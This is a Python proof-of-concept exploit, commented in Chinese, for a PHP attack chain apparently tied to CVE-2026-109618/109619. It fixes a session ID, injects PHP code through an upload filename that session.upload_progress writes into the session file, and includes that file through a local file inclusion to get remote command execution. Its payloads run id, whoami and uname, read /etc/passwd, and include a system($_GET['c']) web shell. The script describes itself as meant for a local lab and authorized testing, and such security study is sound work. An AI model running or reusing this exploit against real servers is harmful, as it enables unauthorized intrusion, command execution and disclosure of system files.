#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Chain A 演示：session.upload_progress 文件名注入 + LFI → RCE
对应 CVE-2026-109618 / 109619 的第一条攻击链（参考 ikow/php2shell-poc）。

流程：
  1. multipart POST：用 body 里的 PHPSESSID 固定会话 ID（绕过 use_only_cookies），
     并在上传文件名里塞 PHP 代码；
  2. PHP 的 upload_progress 把文件名原样写进会话文件 /tmp/sessions/sess_<id>；
  3. 用目标站的 LFI 包含该会话文件 → 执行注入的 PHP → 命令执行。

端口：
  8082 → php2shell（Apache 以 www-data 运行）→ RCE 得到 www-data

用法：
  python poc.py --target http://localhost:8082                 # 默认跑「展示载荷」
  python poc.py --target http://localhost:8082 --cmd "id"      # 只跑一条自定义命令

说明：
  - php2shell 本身给的是 web 运行用户（通常是 www-data），不直接给 root；
    从 www-data 到 root 需要额外的本地提权，不在本靶场范围（见 docs/原理分析.md）。
  - 默认载荷用 PHP_EOL 输出换行，在「终端」里看最清楚；
    想在「浏览器」里看换行，把 PHP_EOL 换成 '<br>'，或用 <pre> 包住输出（见 docs/操作手册.md）。
  - 仅用于本地靶场 / 授权测试。
"""
import argparse
import random
import string
import urllib.parse
import urllib.request

# 默认「展示载荷」：一次证明 命令执行 + 身份 + 系统信息 + 敏感文件读取。
# shell_exec() 返回字符串，方便加标签排版；die() 掐掉会话文件后半段序列化垃圾。
SHOWCASE_PAYLOAD = (
    "<?php "
    "echo '=== ID ===' . PHP_EOL; echo shell_exec('id'); "
    "echo '=== WHOAMI ===' . PHP_EOL; echo shell_exec('whoami'); "
    "echo '=== UNAME ===' . PHP_EOL; echo shell_exec('uname -a'); "
    "echo '=== PASSWD ===' . PHP_EOL; echo shell_exec('head -5 /etc/passwd'); "
    "die(); ?>"
)


def main():
    ap = argparse.ArgumentParser(description="php2shell Chain A 演示")
    ap.add_argument('--target', default='http://localhost:8082',
                    help='目标服务地址，默认 http://localhost:8082')
    ap.add_argument('--cmd', default=None,
                    help='自定义命令，例如 "id"；不传则跑默认展示载荷')
    args = ap.parse_args()
    base = args.target.rstrip('/')

    # 传了 --cmd 就用「单命令载荷」，否则用上面的展示载荷。
    # 单命令载荷从 URL 的 c 参数取命令，所以 --cmd 可以传 "id"、"whoami" 等任意命令。
    if args.cmd:
        payload = "<?php echo '===RCE==='; system($_GET['c']); die(); ?>"
        marker = '===RCE==='
    else:
        payload = SHOWCASE_PAYLOAD
        marker = '=== ID ==='

    # 随机会话 ID（26 位，字符集匹配 PHP 默认会话 ID）
    sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=26))

    # 构造 multipart 请求体：body 里的 PHPSESSID 用来固定会话 ID，
    # filename 里塞 payload——这就是被写进会话文件的那段 PHP 代码。
    b = "----php2shellchain"
    body = (
        f"--{b}\r\n"
        'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid + '\r\n'
        f"--{b}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nchainA\r\n'
        f"--{b}\r\n"
        'Content-Disposition: form-data; name="f"; filename="' + payload + '"\r\n'
        'Content-Type: text/plain\r\n\r\nZ\r\n'
        f"--{b}--\r\n"
    ).encode()

    # 1) 注入：body 与 Cookie 都带固定 SID，触发 upload_progress 把文件名写入会话文件
    req = urllib.request.Request(
        base + '/index.php', data=body,
        headers={
            'Content-Type': f'multipart/form-data; boundary={b}',
            'Cookie': f'PHPSESSID={sid}',
        },
    )
    with urllib.request.urlopen(req, timeout=10):
        pass
    print(f"[1] 已注入，会话文件应为 /tmp/sessions/sess_{sid}")

    # 2) 触发：用 LFI 包含会话文件（传了 --cmd 就顺带传 c 参数）
    url = f"{base}/index.php?page=/tmp/sessions/sess_{sid}"
    if args.cmd:
        url += f"&c={urllib.parse.quote(args.cmd)}"
    print(f"[2] LFI 包含并执行: {url}")
    with urllib.request.urlopen(url, timeout=10) as r:
        raw = r.read().decode(errors='replace')

    # 3) 剥掉会话文件的序列化前缀，只显示干净的命令输出
    print(raw.split(marker, 1)[-1])


if __name__ == '__main__':
    main()
